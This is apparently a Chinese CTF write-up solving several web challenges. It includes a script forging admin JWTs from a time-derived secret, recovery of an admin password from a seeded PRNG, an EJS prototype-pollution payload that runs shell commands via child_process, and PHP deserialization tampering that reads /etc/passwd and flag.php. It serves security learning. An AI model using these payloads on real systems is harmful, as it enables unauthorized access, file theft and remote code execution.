## 被玩坏的AI
暂时不会
## 废弃的网站
源码
```python
from flask import Flask, request, render_template, abort, redirect, render_template_string  
import jwt, hashlib, time  
  
app = Flask(__name__)  
time_started = round(time.time())  
print(f"System started at {time_started}")  
APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest()  
  
tempuser = None  
  
USER_DB = {  
    "admin": {"id": 1, "role": "admin", "name": "Administrator"},  
    "guest": {"id": 2, "role": "guest", "name": "Guest User"},  
}  
  
def admin_required(f):  
    def wrapper(*args, **kwargs):  
        cookie = request.cookies.get('session', None)  
        if cookie is None:  
              
            response = redirect('/')  
            session = jwt.encode(USER_DB['guest'], APP_SECRET, algorithm='HS256')  
            response.set_cookie('session', session)  
            return response  
        try:  
            user_data = jwt.decode(cookie, APP_SECRET, algorithms=['HS256'])  
            if user_data['role'] != 'admin':  
                abort(403, description="Admin access required.")  
            if user_data['name'] != 'Administrator':  
                abort(403, description="Admin access required.")  
            time.sleep(0.15)  
        except jwt.InvalidTokenError:  
            abort(401, description = f"Session expired. Please log in again. System has been running {round(time.time() - time_started)} seconds.")  
        return f(*args, **kwargs)  
    wrapper.__name__ = f.__name__  
    return wrapper  
  
@app.before_request  
def load_user():  
    if request.endpoint == 'static':  
        return  
    global tempuser  
    cookie = request.cookies.get('session', None)  
    if cookie is None:  
        tempuser = USER_DB['guest']  
        session = jwt.encode(tempuser, APP_SECRET, algorithm='HS256')  
        response = redirect(request.path)  
        response.set_cookie('session', session)  
        return response  
    try:  
        user_data = jwt.decode(cookie, APP_SECRET, algorithms=['HS256'])  
        tempuser = user_data  
    except jwt.InvalidTokenError:  
        session = jwt.encode(USER_DB['guest'], APP_SECRET, algorithm='HS256')  
        content = render_template_string(  
            "Session expired. Please log in again. System has been running %d seconds." %  
            (round(time.time() - time_started))  
        )  
        response = app.make_response((content, 401))  
        response.set_cookie('session', session)  
        return response  
      
@app.route('/', methods=['GET'])  
def home():  
    return render_template('index.html')  
  
  
@app.route("/admin", methods=['GET'])  
@admin_required  
def admin_panel():  
    global tempuser  
    return render_template_string("Welcome Back, %s" % tempuser['name'])  
  
@app.route("/static/<path:filename>", methods=['GET'])  
def serve_static(filename):  
    if not filename.endswith('.png'):  
        abort(403, description="Only .png files are allowed.")  
    return app.send_static_file(filename)  
  
if __name__ == '__main__':  
    app.run(host="0.0.0.0", port=5000)
```
可以看到session是通过时间算出来的，也就是session是可以预测到的。
生成逻辑
```
time_started = round(time.time())
APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest() 
```
可以这样
```python
import jwt  
import hashlib  
import time  
import requests  
# 当前时间  
current_time = int(time.time())  
# 获取到的uptime（假设为1024秒）  
uptime = 1024  
base_time_started = current_time - uptime  
# 生成从base-10到base+10的time_started  
tokens = []  
for offset in range(-10, 11):  
    time_started = base_time_started + offset  
    secret = hashlib.sha256(str(time_started).encode()).hexdigest()  
    payload = {"id": 1, "role": "admin", "name": "Administrator"}  
    token = jwt.encode(payload, secret, algorithm='HS256')  
    tokens.append(token)  
# 将token写入文件  
with open('tokens.txt', 'w') as f:  
    for token in tokens:  
        f.write(token + '\n')  
with open('tokens.txt', 'r') as f:  
    for token in f:  
        token = token.strip()  
        cookies = {'session': token}  
        # 尝试访问 admin 页面  
        r = requests.get('http://目标地址/admin', cookies=cookies)  
        if "Welcome Back" in r.text:  
            print(f"[*] 成功找到正确的 Token: {token}")  
            break
```
这样提权成功，接下来就是找出条件竞争。
```
时间线       线程A（攻击者）             线程B（污染者）  
t0          发送/admin请求 (guest token)    
t1          权限检查通过（基于cookie）  
t2          ↓进入150ms等待             持续访问首页，设置tempuser  
t3          ↓                         load_user()将tempuser设为当前用户  
t4          ↓执行admin_panel()函数  
t5          读取tempuser（可能已被污染）  
t6          返回结果
```
用burp开两个爆破端口。
## 小W和小K的故事（最终章）
看源码
```js
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const fs = require('fs');
const lodash = require('lodash');
const random = require('./utils/Random');

const rng = new random(114514);

let app = express();
app.use(bodyParser.urlencoded({ extends: true })).use(bodyParser.json());
app.use('/static', express.static('public'));

app.set('views', './views');
app.set('view engine', 'ejs');
app.use('/static', express.static('static'));

app.use(session({
    name: 'session',
    secret: rng.getRandomString(16),
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 3600000 }
}))

let users = {
    'admin': {
        name: 'admin',
        password: rng.getRandomString(16),
        isAdmin: true,
    },
    'guest': {
        name: 'guest',
        password: "123456",
        isAdmin: false,
    }
}

function auth(req, res, next) {
    if (!req.session.login || !req.session.userid) {
        res.redirect(302, '/login');
    } else {
        next();
    }
}

function adminAuth(req, res, next) {
    if (!req.session.login || !req.session.userid || !users[req.session.userid].isAdmin) {
        res.redirect(302, '/');
    } else {
        next();
    }
}

app.get('/', auth, function(req, res, next){
    res.render('index', { userid: req.session.userid, isAdmin: users[req.session.userid].isAdmin });
});

app.get('/login', async function(req, res, next) {
    res.render('login', { error: null });
})
app.post('/login', async function(req, res, next) {
    let { username, password } = req.body;
    if (!users[username] || users[username].password !== password) {
        res.render('login', { error: 'Invalid username or password' });
    } else {
        req.session.login = true;
        req.session.userid = username;
        res.redirect(302, '/');
    }
})
  
app.get('/admin', adminAuth, async function(req, res, next) {
    res.render('admin', { users: users });
})

app.get('/logout', auth, async function(req, res, next) {
    req.session.destroy();
    res.redirect(302, '/login');
})

app.post('/addUser', adminAuth, async function(req, res, next) {
    lodash.defaultsDeep(users, req.body);
    res.redirect(302, '/admin');
})

app.listen(3000, function() {
    console.log('Server is running on http://localhost:3000');
})
```
漏洞出在
```
app.post('/addUser', adminAuth, async function(req, res, next) {
    lodash.defaultsDeep(users, req.body);
    res.redirect(302, '/admin');
})
```
其中
```
`lodash.defaultsDeep` 会递归地将 `req.body` 中的属性合并到 `users` 对象中。在 JavaScript 中，几乎所有对象都继承自 `Object.prototype`。
```
所以是原型链污染，
还有
```js
const rng = new random(114514);
let users = {
    'admin': {
        name: 'admin',
        password: rng.getRandomString(16),
        isAdmin: true,
    },
```
可以看到管理员密码是伪随机，依赖一个`114514`的种子生成的。
在 Node.js 中，如果 `./utils/Random` 是一个标准的伪随机实现，它通常会基于种子生成一个序列。
所以打开Random
```js
class Random {
    constructor(seed) {
        this.seed = (seed || Date.now()) % 998244353;
    }
    next() {
        this.seed = (this.seed * 48271) % 998244353;
        return this.seed;
    }
    getRandomInt(min, max) {
        return min + (this.next() % (max - min));
    }
    getRandomFloat(min, max) {
        return min + Math.sin(getRandomInt(0, 10000)) * (max - min);
    }
    getRandomString(length) {
        const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";
        for (let i = 0; i < length; i++) {
            result += charset.charAt(this.getRandomInt(0, charset.length));
        }
        return result;
    }
}

module.exports = Random;
```
可以在代码后加几行
```js
// 1. 先用种子 114514 创建一个随机数生成器实例
const rng = new Random(114514);

// 2. 模拟服务器的生成顺序
// 第一次生成的是 session secret，我们要把它“跳过”
const sessionSecret = rng.getRandomString(16);
console.log("Session Secret (用于签名):", sessionSecret);

// 第二次生成的才是 admin 的密码
const adminPassword = rng.getRandomString(16);
console.log("Admin Password (我们要的密码):", adminPassword);
```
这在源码里也是有逻辑的，app.js里
```
secret: rng.getRandomString(16),
password: rng.getRandomString(16),
```
先生成secret在生成password。
再运行`node Random.js`得到
```
Session Secret (用于签名): JbjULcgJmg6EyKcQ
Admin Password (我们要的密码): XrfGpmeEFZmz8NDZ
```
用密码登录成功。
再抓一个`/addUser`的包，发送请求
```
{
  "constructor": {
    "prototype": {
      "client": true,
      "outputFunctionName": "x;throw new Error(process.mainModule.require('child_process').execSync('cat /flag').toString());x"
    }
  }
}
```
跟随重定向，就可以得到flag。这一第一次执行环境会崩溃，要重新开环境。
 这里通过强制使页面报错 并将报错代码改为命令运行结果，这里的payload原来是`{"Xin":{"name":"fsdf","password":"fds","isAdmin":true}}`用来添加用户的，改成恶意payload，
 利用`constructor.prototype`来污染，
 `"client": true`在 EJS 的源代码逻辑中，只有当 `client` 为 `true` 时，编译器才会去读取并拼接我们污染的那个 `outputFunctionName`。
`outputFunctionName`这是 EJS 模板引擎的一个内部配置项。EJS 内部生成代码的逻辑类似于： `var` + **`outputFunctionName`** + `= ...;` 如果你污染了它，生成的代码就变成了： `var` + **`x; [你的恶意代码]; //`** + `= ...;`
`x;`闭合掉 EJS 原本代码中的 `var` 声明。
`throw new Error(...)`回显技巧。执行完命令后，强行抛出一个异常。因为 Express 会把报错内容显示在网页上。
`process.mainModule`获取 Node.js 的主模块对象。这是一种在不手动 `require` 的情况下直接调用系统功能的小技巧。
`.require('child_process')` 动态引入 Node.js 的子进程模块，该模块拥有操作系统的执行权限。
`.execSync('cat /flag')`**核心攻击命令**。`execSync` 会同步运行系统命令。
`.toString()` 将命令读取到的二进制内容转换成我们可以阅读的文本。
`;x`再次用一个变量名收尾，确保 EJS 后面剩下的代码片段不会导致语法报错。
## 眼熟的计算器
不会java，先不做了
## Binary Blog
随便注册一个用户，随便上传一个博客文章，找到一个界面，`blog_manage.php`这里可以文件上传，随便上传一个文件，提示反序列化失败，下载刚才博客的`dat`文件打开是
```
a:4:{s:9:"timestamp";i:1769519363;s:7:"version";s:3:"1.0";s:4:"blog";O:4:"Blog":8:{s:2:"id";i:4;s:5:"title";s:5:"dmjfa";s:7:"content";s:5:"fsdaf";s:7:"user_id";i:3;s:8:"username";s:3:"Xin";s:10:"created_at";s:19:"2026-01-27 21:05:54";s:10:"updated_at";s:19:"2026-01-27 21:05:54";s:8:"template";s:11:"default.php";}s:9:"signature";s:64:"504c2c667f4d7dc8a220ec08e5019e92c2139288199346fe8d8da77c4177ae1c";}
```
发现这里默认是`default.php`，如果改成`/etc/passwd`再上传。发现任意文件读取漏洞。
改成`php://filter/read=convert.base64-encode/resource=flag.php`
记得把前面的长度对应也改了。
还有一个漏洞，就是修改密码抓包是
```
{"username":"Xin","new_password1":"1234567","new_password2":"1234567","csrf_token":"02c5c72ae93cf440b3cf6654437b1adf8e7f5d6c06ae4291a0a01c39313004cc"}
```
这里可以改一下修改管理员的密码。
再登录管理员。










